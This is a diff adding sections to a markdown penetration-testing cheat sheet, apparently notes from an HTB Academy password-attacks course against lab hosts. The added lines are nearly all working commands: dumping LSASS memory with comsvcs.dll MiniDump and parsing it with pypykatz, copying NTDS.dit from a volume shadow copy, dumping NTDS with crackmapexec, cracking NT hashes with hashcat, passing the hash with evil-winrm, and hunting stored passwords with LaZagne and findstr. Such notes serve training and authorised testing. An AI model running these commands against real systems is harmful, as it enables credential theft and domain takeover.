@@ -730,8 +730,53 @@ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 ```
 
 ### Attacking LSASS
+#### Dumping LSASS with Task Manager
+Open Task Manager > Right Click Local Security Authority Process > Create Dump File > Navigate to lsass.DMP
+```
+C:\Users\loggedonusersdirectory\AppData\Local\Temp
+```
+#### Dumping LSASS with Powershell
+```
+Get-Process lsass
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+#### Use Pypykatz to Parse the LSASS Secrets
+```
+pypykatz lsa minidump /path/to/lsass.dmp 
+```
+#### Crack NT Hash with HashCat
+```
+hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
 ### Attacking Active Directory and NTDS.dit
+#### From Evil-WinRM
+```
+vssadmin CREATE SHADOW /For=C:
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+#### From CrackMapExec
+```
+crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
+#### Crack the Hash with Hashcat
+```
+hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+#### OR Pass the Hash
+```
+evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
+
 ### Credential Hunting
+#### Lazagne
+```
+start lazagne.exe all
+```
+#### Findstr
+```
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.pdf
+```
 
 ## Linux Local Password Attacks
 ### Credential Hunting in Linux
